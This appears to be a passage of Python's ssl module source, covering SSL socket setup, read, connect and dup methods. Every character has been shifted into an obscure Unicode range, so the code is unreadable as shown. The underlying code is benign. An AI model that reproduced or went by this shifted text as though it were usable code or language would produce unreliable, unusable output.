ꚹ꛲꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹꛯ꛰꛿ꛬꛮ꛳ꚳꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛮ꛺꛹꛿꛰꜃꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛰꛾꛾꛴꛺꛹ꚫꛈꚫ꛾꛰꛾꛾꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛷꛺꛾꛰ꛯꚫꛈꚫꛑꛬ꛷꛾꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚫꛈꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫꛈꚫꛮ꛺꛹꛿꛰꜃꛿ꚹꛪ꛰꛹ꛮ꛺ꛯ꛰ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꚫꛈꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꚫꛈꚫ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛞ꛰꛰ꚫ꛴꛱ꚫ꜂꛰ꚫꛬ꛽꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿꛻꛰꛰꛽꛹ꛬ꛸꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛚꛞꛐ꛽꛽꛺꛽ꚫꛬ꛾ꚫ꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛰ꚹ꛰꛽꛽꛹꛺ꚫꚬꛈꚫ꛰꛽꛽꛹꛺ꚹꛐꛙꛚꛟꛎꛚꛙꛙꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫꛈꚫꛑꛬ꛷꛾꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚫꛈꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿ꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛰꛿ꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚳꛑꛬ꛷꛾꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛢ꛰ꚫꛬ꛽꛰ꚫ꛹꛺꛿ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫ꛾꛺ꚫ꛿꛳꛴꛾ꚫ꛴꛾ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛾꛰ꛯꚫ꛿꛺ꚫꛭ꛷꛺ꛮ꛶ꚷꚫꛭ꜀꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛿꛰꛾꛿꛴꛹꛲ꚫ꛽꛰꜁꛰ꛬ꛷꛰ꛯꚫ꛺꛿꛳꛰꛽꜂꛴꛾꛰ꚫ꛺꛹ꚫ꛸ꛬꛮꛚꛞꚫꛬ꛹ꛯꚫꛢ꛴꛹ꛯ꛺꜂꛾ꚫ꛾꛺ꚫ꜂꛰ꚫꛯ꛺ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛿꛳꛰ꚫ꛹꛺꛹ꚸꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚫꛯꛬ꛹ꛮ꛰ꚫ꛽꛰꛲ꛬ꛽ꛯ꛷꛰꛾꛾ꚹꚫꛚ꜀꛽ꚫ꛽ꛬ꛴꛾꛰ꚫ꜂꛳꛰꛹ꚫꛬ꛹꜄ꚫꛯꛬ꛿ꛬꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛴꛾ꚫ꛱꛺꜀꛹ꛯꚫ꛸꛰ꛬ꛹꛾ꚫꛮ꛺꛹꛾꜀꛸꛴꛹꛲ꚫ꛿꛳꛰ꚫꛯꛬ꛿ꛬꚫ꛴꛾ꚫ꛳ꛬ꛽꛸꛷꛰꛾꛾ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛺꛿ꛮ꛺꛹꛹ꛪ꛻꛽꛰ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪꛯꛬ꛿ꛬꚫꛈꚫ꛾꛰꛷꛱ꚹ꛽꛰ꛮ꜁ꚳꚼꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛚꛞꛐ꛽꛽꛺꛽ꚫꛬ꛾ꚫ꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛐꛔꛙꛡꛌꛗꚫ꛺ꛮꛮ꜀꛽꛾ꚫ꛱꛺꛽ꚫ꛽꛰ꛮ꜁ꚳꚼꚴꚫ꛺꛹ꚫ꛹꛺꛹ꚸꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫ꛺꛹ꚫ꜀꛹꛴꜃ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛰ꚹ꛰꛽꛽꛹꛺ꚫ꛹꛺꛿ꚫ꛴꛹ꚫꚳ꛰꛽꛽꛹꛺ꚹꛐꛙꛚꛟꛎꛚꛙꛙꚷꚫ꛰꛽꛽꛹꛺ꚹꛐꛔꛙꛡꛌꛗꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛺꛿ꛮ꛺꛹꛹ꛪ꛻꛽꛰ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪꛯꛬ꛿ꛬꚫꛈꚫꛭꚲꚲꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛰꛿ꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚳꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꛮ꛺꛹꛹ꛪ꛻꛽꛰ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪꛯꛬ꛿ꛬꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛟ꛳꛴꛾ꚫ꛻꛽꛰꜁꛰꛹꛿꛾ꚫ꛻꛰꛹ꛯ꛴꛹꛲ꚫꛯꛬ꛿ꛬꚫ꛾꛰꛹꛿ꚫ꛿꛺ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫꛭ꛰꛱꛺꛽꛰ꚫ꛴꛿ꚫ꜂ꛬ꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛮ꛷꛺꛾꛰ꛯꚫ꛱꛽꛺꛸ꚫ꛰꛾ꛮꛬ꛻꛴꛹꛲ꚫ꛿꛺ꚫ꛿꛳꛰ꚫꛮꛬ꛷꛷꛰꛽ꚫ꜂꛳꛺ꚫꛮ꛺꜀꛷ꛯꚫ꛺꛿꛳꛰꛽꜂꛴꛾꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛻꛽꛰꛾꜀꛸꛰ꚫ꛴꛿ꚫꛮꛬ꛸꛰ꚫ꛿꛳꛽꛺꜀꛲꛳ꚫꛬꚫ꛾꜀ꛮꛮ꛰꛾꛾꛱꜀꛷ꚫꛟꛗꛞꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰ꛬ꛾꛺꛹ꚫꛈꚫꚭꛎ꛷꛺꛾꛰ꛯꚫꛭ꛰꛱꛺꛽꛰ꚫꛟꛗꛞꚫ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚫ꜂꛴꛿꛳ꚫꛯꛬ꛿ꛬꚫ꛴꛹ꚫ꛽꛰ꛮ꜁ꚫꛭ꜀꛱꛱꛰꛽ꚹꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛺꛿ꛮ꛺꛹꛹ꛪ꛻꛽꛰ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪꛯꛬ꛿ꛬꛪ꛰꛽꛽꛺꛽ꚫꛈꚫꛞꛞꛗꛐ꛽꛽꛺꛽ꚳ꛰ꚹ꛰꛽꛽꛹꛺ꚷꚫ꛽꛰ꛬ꛾꛺꛹ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛌꛯꛯꚫ꛿꛳꛰ꚫꛞꛞꛗꛐ꛽꛽꛺꛽ꚫꛬ꛿꛿꛽꛴ꛭ꜀꛿꛰꛾ꚫ꛿꛳ꛬ꛿ꚫꛪ꛾꛾꛷ꚹꛮꚫꛬ꛷꜂ꛬ꜄꛾ꚫꛬꛯꛯ꛾ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛺꛿ꛮ꛺꛹꛹ꛪ꛻꛽꛰ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪꛯꛬ꛿ꛬꛪ꛰꛽꛽꛺꛽ꚹ꛽꛰ꛬ꛾꛺꛹ꚫꛈꚫ꛽꛰ꛬ꛾꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛺꛿ꛮ꛺꛹꛹ꛪ꛻꛽꛰ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪꛯꛬ꛿ꛬꛪ꛰꛽꛽꛺꛽ꚹ꛷꛴ꛭ꛽ꛬ꛽꜄ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛮ꛷꛺꛾꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛚꛞꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫ꛹꛺꛿ꛮ꛺꛹꛹ꛪ꛻꛽꛰ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪꛯꛬ꛿ꛬꛪ꛰꛽꛽꛺꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛹ꛬ꛷꛷꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛐ꜃꛻꛷꛴ꛮ꛴꛿꛷꜄ꚫꛭ꛽꛰ꛬ꛶ꚫ꛿꛳꛰ꚫ꛽꛰꛱꛰꛽꛰꛹ꛮ꛰ꚫꛮ꜄ꛮ꛷꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹꛺꛿ꛮ꛺꛹꛹ꛪ꛻꛽꛰ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪꛯꛬ꛿ꛬꛪ꛰꛽꛽꛺꛽ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫꛈꚫꛟ꛽꜀꛰ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳ꛾꛺ꛮ꛶ꛪ꛿꛴꛸꛰꛺꜀꛿ꚴꚫꚫꚮꚫꛘ꜀꛾꛿ꚫꛮ꛺꛸꛰ꚫꛬ꛱꛿꛰꛽ꚫ꛾꛰꛿ꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚳꚴꚫꛮꛬ꛷꛷꛾ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫꛈꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛮ꛽꛰ꛬ꛿꛰ꚫ꛿꛳꛰ꚫꛞꛞꛗꚫ꛺ꛭ꛵꛰ꛮ꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫꛈꚫ꛾꛰꛷꛱ꚹꛪꛮ꛺꛹꛿꛰꜃꛿ꚹꛪ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚷꚫ꛾꛰꛷꛱ꚹ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꜂꛹꛰꛽ꛈ꛾꛰꛷꛱ꚷꚫ꛾꛰꛾꛾꛴꛺꛹ꛈ꛾꛰꛷꛱ꚹꛪ꛾꛰꛾꛾꛴꛺꛹ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛴꛸꛰꛺꜀꛿ꚫꛈꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫꛈꛈꚫꚻꚹꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛹꛺꛹ꚸꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꚫ꛾꛳꛺꜀꛷ꛯꚫ꛹꛺꛿ꚫꛭ꛰ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚫ꛱꛺꛽ꚫ꛹꛺꛹ꚸꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꚳꛚꛞꛐ꛽꛽꛺꛽ꚷꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛮ꛷꛺꛾꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛺꛹꛿꛰꜃꛿ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪꛮ꛺꛹꛿꛰꜃꛿ꚕꚕꚫꚫꚫꚫꛋꛮ꛺꛹꛿꛰꜃꛿ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛺꛹꛿꛰꜃꛿ꚳ꛾꛰꛷꛱ꚷꚫꛮ꛿꜃ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛮ꛿꜃ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛮ꛿꜃ꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛾꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛾꛾꛴꛺꛹ꚕꚕꚫꚫꚫꚫꛋ꛾꛰꛾꛾꛴꛺꛹ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛾꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚷꚫ꛾꛰꛾꛾꛴꛺꛹ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛰꛾꛾꛴꛺꛹ꚫꛈꚫ꛾꛰꛾꛾꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛾꛾꛴꛺꛹ꚫꛈꚫ꛾꛰꛾꛾꛴꛺꛹ꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛾꛾꛴꛺꛹ꛪ꛽꛰꜀꛾꛰ꛯꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛾꛾꛴꛺꛹ꛪ꛽꛰꜀꛾꛰ꛯꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛯ꜀꛻ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛙ꛺꛿ꛔ꛸꛻꛷꛰꛸꛰꛹꛿꛰ꛯꛐ꛽꛽꛺꛽ꚳꚭꛎꛬ꛹ꚲ꛿ꚫꛯ꜀꛻ꚳꚴꚫꚰ꛾ꚫ꛴꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚹꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳ꛾꛰꛷꛱ꚷꚫ꛸꛾꛲ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛽ꛬ꛴꛾꛰ꚫꛬ꛹ꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹ꚫ꛳꛰꛽꛰ꚫ꛴꛱ꚫ꜄꛺꜀ꚫ꜂꛴꛾꛳ꚫ꛿꛺ꚫꛮ꛳꛰ꛮ꛶ꚫ꛱꛺꛽ꚫ꛾꛻꜀꛽꛴꛺꜀꛾ꚫꛮ꛷꛺꛾꛰꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛮ꛳꛰ꛮ꛶ꛪꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛾꛰꛷꛱ꚹꛪꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛲꛰꛿꛻꛰꛰꛽꛹ꛬ꛸꛰ꚳꚴꚫ꜂꛴꛷꛷ꚫ꛽ꛬ꛴꛾꛰ꚫꛐꛙꛚꛟꛎꛚꛙꛙꚫ꛴꛱ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚫ꛽꛰ꛬ꛷꛷꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛹꛺꛿ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꛆꚫ꛹꛺꛿꛰ꚫ꛿꛳ꛬ꛿ꚫ꜂꛰ꚫꛮꛬ꛹ꚫꛭ꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫ꛰꜁꛰꛹ꚫ꜂꛴꛿꛳꛺꜀꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛪꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫꛭ꛰꛴꛹꛲ꚫ꛾꛰꛿ꚷꚫ꛰ꚹ꛲ꚹꚫ꛴꛱ꚫꛮ꛺꛹꛹꛰ꛮ꛿ꚳꚴꚫ꛱꛴꛽꛾꛿ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛐꛌꛒꛌꛔꛙꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿꛻꛰꛰꛽꛹ꛬ꛸꛰ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛬꛯꚳ꛾꛰꛷꛱ꚷꚫ꛷꛰꛹ꛈꚼꚻꚽꚿꚷꚫꛭ꜀꛱꛱꛰꛽ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰ꛬꛯꚫ꜀꛻ꚫ꛿꛺ꚫꛗꛐꛙꚫꛭ꜄꛿꛰꛾ꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰꛸ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛝ꛰꛿꜀꛽꛹ꚫ꜅꛰꛽꛺ꚸ꛷꛰꛹꛲꛿꛳ꚫ꛾꛿꛽꛴꛹꛲ꚫ꛺꛹ꚫꛐꛚꛑꚹꚭꚭꚭꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳ